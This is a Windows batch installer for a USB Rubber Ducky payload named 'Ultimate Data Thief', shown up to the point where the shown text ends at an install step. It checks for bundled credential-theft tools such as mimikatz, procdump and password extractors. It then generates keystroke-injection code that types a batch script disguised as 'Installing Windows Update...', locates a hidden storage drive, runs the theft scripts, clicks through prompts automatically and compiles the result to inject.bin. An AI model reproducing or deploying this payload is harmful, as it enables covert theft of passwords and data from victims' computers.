@echo off
:start
%~d0
cd "%~dp0"
REM DONT CHANGE THESE VARIABLES! THEY MAY CAUSE THE PROGRAM TO FUNCTION INCORRECTLY.
set valid_drive=true
set ducky_valid=true
set storage_valid=true
set duck_encoder_version=2.6
set delaycheck=1111
set delay=2222
Title = Data Thief Installer [Verifying requirements]
@echo Checking encoder availability...
if not exist "Tools\encoder.jar" @echo FAILED TO LOCATE "Tools\encoder.jar"! Error 404.
if not exist "Tools\encoder.jar" goto end
if not exist "Tools\resources" @echo FAILED TO LOCATE "Tools\resources"! Error 404.
if not exist "Tools\resources" goto end
@echo Status - [OK]
@echo Checking Java availability...
@echo %PATH% > "%TEMP%\DTI_PATH_CHECK.txt"
set errorlevel=
findstr /m "Java" "%TEMP%\DTI_PATH_CHECK.txt" >nul
if "%errorlevel%"=="1" @echo FAILED TO LOCATE THE JAVA INSTALLATION! REASON:
if "%errorlevel%"=="1" @echo Not registered in the PATH variable. Error 404.
if "%errorlevel%"=="1" goto end
if not exist "%ProgramFiles%\Java" @echo FAILED TO LOCATE THE JAVA INSTALLATION! REASON:
if not exist "%ProgramFiles%\Java" @echo Directory "%ProgramFiles%\Java" does not exist.
if not exist "%ProgramFiles%\Java" goto end
@echo Status - [OK]
@echo Checking external data...
set checkfile=Tools\Data\7z.dll
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\7z.exe
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\7z.sfx
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\7zCon.sfx
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\7-zip.dll
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Backup Eraser.bat
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Execution_Complete.wav
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\invis.vbs
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\keyrec.zip
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\mimikatz.zip
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Password_Extractor.bat
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\procdump.exe
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\ProduKey.zip
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\ProduKeyx64.zip
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\SCRIPT_EX.bat
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\SCRIPT_EX.exe
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\SP.bat
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Wind.exe
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Password_Extractor_Local_DIR.bat
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\init.d
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\File_Spammer.bat
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\Fraction_Converter.bat
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\LavaPrompt2.2.bat
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\7-zip.dll
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\7z.dll
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\7z.exe
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\7z.sfx
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\7zCon.sfx
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\icon_new.ico
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\keyrec.dat
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\LavaPrompt_Daemon_1.6.exe
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\LavaPrompt_Daemon_Installer.exe
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\LavaPrompt_Daemon_Start_1.6.exe
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\msg.exe
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\runasadmin.bat
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\runasadmin.exe
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\Student.exe
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\SwitchToStudent.exe
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\SwitchToTeacher.exe
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\Extras\LavaPrompt_Command_Terminal\bin\Teacher.exe
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\init.d
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
set checkfile=Tools\Data\init.d\READ ME!.txt
if not exist "%checkfile%" @echo Error 404 - Failed to locate "%checkfile%"!
if not exist "%checkfile%" goto end
Title = Data Thief Installer
cls
@echo This installer will install the Ducky Payload
@echo "Ultimate Data Thief".
@echo.
@echo Built in payload data version: 1.9
@echo.
@echo Type the following to continue:
@echo INSTALL THE PAYLOAD!
@echo --------------------
set input=
set /p input=%=%
@echo --------------------
if not "%input%"=="INSTALL THE PAYLOAD!" cls
if not "%input%"=="INSTALL THE PAYLOAD!" @echo Sorry, that wasn't what you were meant to enter.
if not "%input%"=="INSTALL THE PAYLOAD!" goto start
:ducky_select
cls
if not "%valid_drive%"=="true" @echo Invalid storage device entered.
if not "%ducky_valid%"=="true" @echo Unable to locate the specified drive.
if exist "A:\" @echo Drive A:
if exist "B:\" @echo Drive B:
if exist "D:\" @echo Drive D:
if exist "E:\" @echo Drive E:
if exist "F:\" @echo Drive F:
if exist "G:\" @echo Drive G:
if exist "H:\" @echo Drive H:
if exist "I:\" @echo Drive I:
if exist "J:\" @echo Drive J:
if exist "K:\" @echo Drive K:
if exist "L:\" @echo Drive L:
if exist "M:\" @echo Drive M:
if exist "N:\" @echo Drive N:
if exist "O:\" @echo Drive O:
if exist "P:\" @echo Drive P:
if exist "Q:\" @echo Drive Q:
if exist "R:\" @echo Drive R:
if exist "S:\" @echo Drive S:
if exist "T:\" @echo Drive T:
if exist "U:\" @echo Drive U:
if exist "V:\" @echo Drive V:
if exist "W:\" @echo Drive W:
if exist "X:\" @echo Drive X:
if exist "Y:\" @echo Drive Y:
if exist "Z:\" @echo Drive Z:
@echo ------------------------
@echo What drive is the ducky?
set ducky=
set /p ducky=Drive: %=%
if "%ducky%"=="" goto ducky_select
if "%ducky%"=="A" set ducky=A:
if "%ducky%"=="a" set ducky=A:
if "%ducky%"=="B" set ducky=B:
if "%ducky%"=="b" set ducky=B:
if "%ducky%"=="D" set ducky=D:
if "%ducky%"=="d" set ducky=D:
if "%ducky%"=="E" set ducky=E:
if "%ducky%"=="e" set ducky=E:
if "%ducky%"=="F" set ducky=F:
if "%ducky%"=="f" set ducky=F:
if "%ducky%"=="G" set ducky=G:
if "%ducky%"=="g" set ducky=G:
if "%ducky%"=="H" set ducky=H:
if "%ducky%"=="h" set ducky=H:
if "%ducky%"=="I" set ducky=I:
if "%ducky%"=="i" set ducky=I:
if "%ducky%"=="J" set ducky=J:
if "%ducky%"=="j" set ducky=J:
if "%ducky%"=="K" set ducky=K:
if "%ducky%"=="k" set ducky=K:
if "%ducky%"=="L" set ducky=L:
if "%ducky%"=="l" set ducky=L:
if "%ducky%"=="M" set ducky=M:
if "%ducky%"=="m" set ducky=M
if "%ducky%"=="N" set ducky=N:
if "%ducky%"=="n" set ducky=N:
if "%ducky%"=="O" set ducky=O:
if "%ducky%"=="o" set ducky=O:
if "%ducky%"=="P" set ducky=P:
if "%ducky%"=="p" set ducky=P:
if "%ducky%"=="Q" set ducky=Q:
if "%ducky%"=="q" set ducky=Q:
if "%ducky%"=="R" set ducky=R:
if "%ducky%"=="r" set ducky=R:
if "%ducky%"=="S" set ducky=S:
if "%ducky%"=="s" set ducky=S:
if "%ducky%"=="T" set ducky=T:
if "%ducky%"=="t" set ducky=T:
if "%ducky%"=="U" set ducky=U:
if "%ducky%"=="u" set ducky=U:
if "%ducky%"=="V" set ducky=V:
if "%ducky%"=="v" set ducky=V:
if "%ducky%"=="W" set ducky=W:
if "%ducky%"=="w" set ducky=W:
if "%ducky%"=="X" set ducky=X:
if "%ducky%"=="x" set ducky=X:
if "%ducky%"=="Y" set ducky=Y:
if "%ducky%"=="y" set ducky=Y:
if "%ducky%"=="Z" set ducky=Z:
if "%ducky%"=="z" set ducky=Z:
set ducky=%ducky:a=A%
set ducky=%ducky:b=B%
set ducky=%ducky:d=D%
set ducky=%ducky:e=E%
set ducky=%ducky:f=F%
set ducky=%ducky:g=G%
set ducky=%ducky:h=H%
set ducky=%ducky:i=I%
set ducky=%ducky:j=J%
set ducky=%ducky:k=K%
set ducky=%ducky:l=L%
set ducky=%ducky:m=M%
set ducky=%ducky:n=N%
set ducky=%ducky:o=O%
set ducky=%ducky:p=P%
set ducky=%ducky:q=Q%
set ducky=%ducky:r=R%
set ducky=%ducky:s=S%
set ducky=%ducky:t=T%
set ducky=%ducky:u=U%
set ducky=%ducky:v=V%
set ducky=%ducky:w=W%
set ducky=%ducky:x=X%
set ducky=%ducky:y=Y%
set ducky=%ducky:z=Z%
set valid_drive=false
if "%ducky%"=="A:" set valid_drive=true
if "%ducky%"=="B:" set valid_drive=true
if "%ducky%"=="D:" set valid_drive=true
if "%ducky%"=="E:" set valid_drive=true
if "%ducky%"=="F:" set valid_drive=true
if "%ducky%"=="G:" set valid_drive=true
if "%ducky%"=="H:" set valid_drive=true
if "%ducky%"=="I:" set valid_drive=true
if "%ducky%"=="J:" set valid_drive=true
if "%ducky%"=="K:" set valid_drive=true
if "%ducky%"=="L:" set valid_drive=true
if "%ducky%"=="M:" set valid_drive=true
if "%ducky%"=="N:" set valid_drive=true
if "%ducky%"=="O:" set valid_drive=true
if "%ducky%"=="P:" set valid_drive=true
if "%ducky%"=="Q:" set valid_drive=true
if "%ducky%"=="R:" set valid_drive=true
if "%ducky%"=="S:" set valid_drive=true
if "%ducky%"=="T:" set valid_drive=true
if "%ducky%"=="U:" set valid_drive=true
if "%ducky%"=="V:" set valid_drive=true
if "%ducky%"=="W:" set valid_drive=true
if "%ducky%"=="X:" set valid_drive=true
if "%ducky%"=="Y:" set valid_drive=true
if "%ducky%"=="Z:" set valid_drive=true
if not "%valid_drive%"=="true" goto ducky_select
if not exist "%ducky%\" set ducky_valid=false
if not exist "%ducky%\" goto ducky_select
:storage_select
cls
if not "%valid_drive%"=="true" @echo Invalid storage device entered.
if not "%storage_valid%"=="true" @echo Unable to locate the specified drive.
if exist "A:\" @echo Drive A:
if exist "B:\" @echo Drive B:
if exist "D:\" @echo Drive D:
if exist "E:\" @echo Drive E:
if exist "F:\" @echo Drive F:
if exist "G:\" @echo Drive G:
if exist "H:\" @echo Drive H:
if exist "I:\" @echo Drive I:
if exist "J:\" @echo Drive J:
if exist "K:\" @echo Drive K:
if exist "L:\" @echo Drive L:
if exist "M:\" @echo Drive M:
if exist "N:\" @echo Drive N:
if exist "O:\" @echo Drive O:
if exist "P:\" @echo Drive P:
if exist "Q:\" @echo Drive Q:
if exist "R:\" @echo Drive R:
if exist "S:\" @echo Drive S:
if exist "T:\" @echo Drive T:
if exist "U:\" @echo Drive U:
if exist "V:\" @echo Drive V:
if exist "W:\" @echo Drive W:
if exist "X:\" @echo Drive X:
if exist "Y:\" @echo Drive Y:
if exist "Z:\" @echo Drive Z:
@echo ------------------------
@echo What drive is the storage? If you have the "twin duck" firmware installed
@echo then you could just use the ducky storage instead - though transfer
@echo rates may be slow depending on what data is being transferred.
set storage=
set /p storage=Drive: %=%
if "%storage%"=="" goto storage_select
if "%storage%"=="A" set storage=A:
if "%storage%"=="a" set storage=A:
if "%storage%"=="B" set storage=B:
if "%storage%"=="b" set storage=B:
if "%storage%"=="D" set storage=D:
if "%storage%"=="d" set storage=D:
if "%storage%"=="E" set storage=E:
if "%storage%"=="e" set storage=E:
if "%storage%"=="F" set storage=F:
if "%storage%"=="f" set storage=F:
if "%storage%"=="G" set storage=G:
if "%storage%"=="g" set storage=G:
if "%storage%"=="H" set storage=H:
if "%storage%"=="h" set storage=H:
if "%storage%"=="I" set storage=I:
if "%storage%"=="i" set storage=I:
if "%storage%"=="J" set storage=J:
if "%storage%"=="j" set storage=J:
if "%storage%"=="K" set storage=K:
if "%storage%"=="k" set storage=K:
if "%storage%"=="L" set storage=L:
if "%storage%"=="l" set storage=L:
if "%storage%"=="M" set storage=M:
if "%storage%"=="m" set storage=M
if "%storage%"=="N" set storage=N:
if "%storage%"=="n" set storage=N:
if "%storage%"=="O" set storage=O:
if "%storage%"=="o" set storage=O:
if "%storage%"=="P" set storage=P:
if "%storage%"=="p" set storage=P:
if "%storage%"=="Q" set storage=Q:
if "%storage%"=="q" set storage=Q:
if "%storage%"=="R" set storage=R:
if "%storage%"=="r" set storage=R:
if "%storage%"=="S" set storage=S:
if "%storage%"=="s" set storage=S:
if "%storage%"=="T" set storage=T:
if "%storage%"=="t" set storage=T:
if "%storage%"=="U" set storage=U:
if "%storage%"=="u" set storage=U:
if "%storage%"=="V" set storage=V:
if "%storage%"=="v" set storage=V:
if "%storage%"=="W" set storage=W:
if "%storage%"=="w" set storage=W:
if "%storage%"=="X" set storage=X:
if "%storage%"=="x" set storage=X:
if "%storage%"=="Y" set storage=Y:
if "%storage%"=="y" set storage=Y:
if "%storage%"=="Z" set storage=Z:
if "%storage%"=="z" set storage=Z:
set storage=%storage:a=A%
set storage=%storage:b=B%
set storage=%storage:d=D%
set storage=%storage:e=E%
set storage=%storage:f=F%
set storage=%storage:g=G%
set storage=%storage:h=H%
set storage=%storage:i=I%
set storage=%storage:j=J%
set storage=%storage:k=K%
set storage=%storage:l=L%
set storage=%storage:m=M%
set storage=%storage:n=N%
set storage=%storage:o=O%
set storage=%storage:p=P%
set storage=%storage:q=Q%
set storage=%storage:r=R%
set storage=%storage:s=S%
set storage=%storage:t=T%
set storage=%storage:u=U%
set storage=%storage:v=V%
set storage=%storage:w=W%
set storage=%storage:x=X%
set storage=%storage:y=Y%
set storage=%storage:z=Z%
set valid_drive=false
if "%storage%"=="A:" set valid_drive=true
if "%storage%"=="B:" set valid_drive=true
if "%storage%"=="D:" set valid_drive=true
if "%storage%"=="E:" set valid_drive=true
if "%storage%"=="F:" set valid_drive=true
if "%storage%"=="G:" set valid_drive=true
if "%storage%"=="H:" set valid_drive=true
if "%storage%"=="I:" set valid_drive=true
if "%storage%"=="J:" set valid_drive=true
if "%storage%"=="K:" set valid_drive=true
if "%storage%"=="L:" set valid_drive=true
if "%storage%"=="M:" set valid_drive=true
if "%storage%"=="N:" set valid_drive=true
if "%storage%"=="O:" set valid_drive=true
if "%storage%"=="P:" set valid_drive=true
if "%storage%"=="Q:" set valid_drive=true
if "%storage%"=="R:" set valid_drive=true
if "%storage%"=="S:" set valid_drive=true
if "%storage%"=="T:" set valid_drive=true
if "%storage%"=="U:" set valid_drive=true
if "%storage%"=="V:" set valid_drive=true
if "%storage%"=="W:" set valid_drive=true
if "%storage%"=="X:" set valid_drive=true
if "%storage%"=="Y:" set valid_drive=true
if "%storage%"=="Z:" set valid_drive=true
if not "%valid_drive%"=="true" goto storage_select
if not exist "%storage%\" set storage_valid=false
if not exist "%storage%\" goto storage_select
:delay_picker
cls
if "%delaycheck%"=="%delay%" @echo Entered value invalid.
if "%delaycheck%"=="1" @echo Entered value invalid.
set delaycheck=
set delay=
@echo How much of a delay do you want on the start of the payload?
@echo If you are using the "4CAP" firmware, then I recommend
@echo leaving the field blank. Remember, 1000 is 1 second.
set delay=
set /p delay=%=%
if "%delay%"=="" goto label_picker
if "%delay%"=="0" goto label_picker
if "%delay%"=="00" goto label_picker
if "%delay%"=="000" goto label_picker
if "%delay%"=="0000" goto label_picker
@echo Checking if the input is a numeric value...
set delaycheck=%delay%
set /a delaycheck=%delaycheck%+1
if "%delaycheck%"=="%delay%" goto delay_picker
if "%delaycheck%"=="1" goto delay_picker
cls
:label_picker
@echo What label does the storage device have?
@echo E.g. JUNK
set storage_label=
set /p storage_label=Label: %=%
if "%storage_label%"=="" cls
if "%storage_label%"=="" @echo No label entered.
if "%storage_label%"=="" goto label_picker
if "%storage_label%"==" " cls
if "%storage_label%"==" " @echo No label entered.
if "%storage_label%"==" " goto label_picker
if "%storage_label%"=="  " cls
if "%storage_label%"=="  " @echo No label entered.
if "%storage_label%"=="  " goto label_picker
if "%storage_label%"=="   " cls
if "%storage_label%"=="   " @echo No label entered.
if "%storage_label%"=="   " goto label_picker
:keyboard_properties
cls
cd "Tools\resources"
@echo -----------------------------------------------
DIR /B
@echo -----------------------------------------------
cd..
cd..
@echo Enter the name of the keyboard properties file.
@echo You do not need to include ".properties" but you can if you want to.
set kpropertiesfile=
set /p kpropertiesfile=File: %=%
if "%kpropertiesfile%"=="" goto keyboard_properties
if not exist "Tools\resources\%kpropertiesfile%" set kpropertiesfile=%kpropertiesfile%.properties
if not exist "Tools\resources\%kpropertiesfile%" @echo Unable to locate "Tools\resources\%kpropertiesfile%"!
if not exist "Tools\resources\%kpropertiesfile%" goto keyboard_properties
:install_payload
cls
if "%delay%"=="" set delay=none
if "%delay%"=="0" set delay=none
if "%delay%"=="00" set delay=none
if "%delay%"=="000" set delay=none
if "%delay%"=="0000" set delay=none
@echo ----------------------------
@echo ---- Generating Payload ---
@echo ----------------------------
@echo Ducky: %ducky%
@echo Storage: %storage%
@echo Storage label: %storage_label%
@echo Delay: %delay%
@echo Duck Encoder Version: %duck_encoder_version%
if exist "%storage%\Data" goto backup_warning
goto write_inject.txt
:backup_warning
@echo WARNING! All data located in "%storage%\Data" WILL be removed.
@echo THE DATA MAY NOT BE RECOVERABLE!
@echo Continue? Y/N:
set backup_warning_input=
set /p backup_warning_input=%=%
if "%backup_warning_input%"=="n" @echo Installation aborted.
if "%backup_warning_input%"=="n" goto end
if "%backup_warning_input%"=="N" @echo Installation aborted.
if "%backup_warning_input%"=="N" goto end
if "%backup_warning_input%"=="y" @echo OK, erasing old data...
if "%backup_warning_input%"=="y" RD /S /Q "%storage%\Data"
if "%backup_warning_input%"=="y" goto write_inject.txt
if "%backup_warning_input%"=="Y" @echo OK, erasing old data...
if "%backup_warning_input%"=="Y" RD /S /Q "%storage%\Data"
if "%backup_warning_input%"=="Y" goto write_inject.txt
@echo No valid option entered.
goto backup_warning
:write_inject.txt
@echo Writing the inject.txt file with the custom variables...
if exist "%TEMP%\inject.txt" del /f "%TEMP%\inject.txt"
if exist "%TEMP%\inject.txt" @echo Unable to remove "%TEMP%\inject.txt"!
if exist "%TEMP%\inject.txt" goto end
if not "%delay%"=="none" @echo DELAY %delay% > "%TEMP%\inject.txt"
@echo REM Author: Lavanoid Volcanic >> "%TEMP%\inject.txt"
@echo REM This script supports Windows XP as well as Vista and 7. >> "%TEMP%\inject.txt"
@echo REM I don't have Windows 8 (I really want it though) so I cant test it. >> "%TEMP%\inject.txt"
if not "%storage_label%"=="DUCKY" @echo REM This Script looks for the drive named "%storage_label%" because "DUCKY" is too exposing. >> "%TEMP%\inject.txt"
@echo GUI d >> "%TEMP%\inject.txt"
@echo DELAY 500 >> "%TEMP%\inject.txt"
@echo GUI r >> "%TEMP%\inject.txt"
@echo DELAY 1500 >> "%TEMP%\inject.txt"
@echo STRING notepad.exe>> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo DELAY 1500 >> "%TEMP%\inject.txt"
@echo STRING @echo off >> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo STRING Ti>> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo STRING tle = Installing Windows Update... >> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING @echo Installing Windows Update... >> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING set duck=>> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING COLOR F0 >> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING :start>> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING if not "%%LOCALAPPDATA%%"=="" goto win_new>> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
set percent_icon=%%%%
@echo STRING for /f "tokens=3 delims= " %percent_icon%A in ('echo list volume ^^^| diskpart ^^^| findstr "%storage_label%"') do set duck=%percent_icon%A>> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING if "%%duck%%"=="" goto start>> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING set duck=%%duck%%:>> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING %%duck%%>> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING CD "Data">> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING "SCRIPT_EX.exe" "SP.bat">> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING EXIT >> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING :win_new>> "%TEMP%\inject.txt"
@echo DELAY 400 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo DELAY 400 >> "%TEMP%\inject.txt"
@echo STRING for /f %percent_icon%d in ('wmic volume get driveletter^^^, label ^^^| findstr "%storage_label%"') do set duck=%percent_icon%d>> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING if "%%duck%%"=="" goto start>> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING %%duck%%>> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING CD "Data">> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING "SCRIPT_EX.exe" "SP.bat">> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo STRING EXIT >> "%TEMP%\inject.txt"
@echo DELAY 200 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo CTRL S >> "%TEMP%\inject.txt"
@echo DELAY 1500 >> "%TEMP%\inject.txt"
@echo STRING %%TEMP%%\DS.bat >> "%TEMP%\inject.txt"
@echo DELAY 1000 >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo DELAY 600 >> "%TEMP%\inject.txt"
@echo ALT Y >> "%TEMP%\inject.txt"
@echo DELAY 700 >> "%TEMP%\inject.txt"
@echo ALT F4 >> "%TEMP%\inject.txt"
@echo GUI r >> "%TEMP%\inject.txt"
@echo DELAY 1500 >> "%TEMP%\inject.txt"
@echo STRING %%TEMP%%\DS.bat >> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo DELAY 1000 >> "%TEMP%\inject.txt"
@echo ALT y >> "%TEMP%\inject.txt"
@echo DELAY 500 >> "%TEMP%\inject.txt"
@echo ALT y >> "%TEMP%\inject.txt"
@echo DELAY 500 >> "%TEMP%\inject.txt"
@echo ALT y >> "%TEMP%\inject.txt"
@echo DELAY 500 >> "%TEMP%\inject.txt"
@echo ALT y >> "%TEMP%\inject.txt"
@echo DELAY 500 >> "%TEMP%\inject.txt"
@echo ALT y >> "%TEMP%\inject.txt"
@echo DELAY 500 >> "%TEMP%\inject.txt"
@echo ALT y >> "%TEMP%\inject.txt"
@echo DELAY 500 >> "%TEMP%\inject.txt"
@echo ALT y >> "%TEMP%\inject.txt"
@echo GUI r >> "%TEMP%\inject.txt"
@echo DELAY 1200 >> "%TEMP%\inject.txt"
@echo STRING explorer.exe>> "%TEMP%\inject.txt"
@echo ENTER >> "%TEMP%\inject.txt"
@echo DELAY 1500 >> "%TEMP%\inject.txt"
@echo ALT F4 >> "%TEMP%\inject.txt"
if exist "%TEMP%\inject.txt" @echo Successfully wrote "inject.txt".
:compile_inject.txt
@echo Compiling inject.txt...
if exist "%TEMP%\inject.bin" del /f "%TEMP%\inject.bin"
if exist "%TEMP%\inject.bin" @echo Unable to remove "%TEMP%\inject.bin"!
if exist "%TEMP%\inject.bin" goto end
java -jar "Tools\encoder.jar"  -l "Tools\resources\%kpropertiesfile%" -i "%TEMP%\inject.txt" -o "%TEMP%\inject.bin"
if exist "%TEMP%\inject.bin" @echo Successfully compiled inject.txt -^> inject.bin
if not exist "%TEMP%\inject.bin" @echo Failed to compile inject.txt -^> inject.bin!
if not exist "%TEMP%\inject.bin" goto end
:install_inject.dat
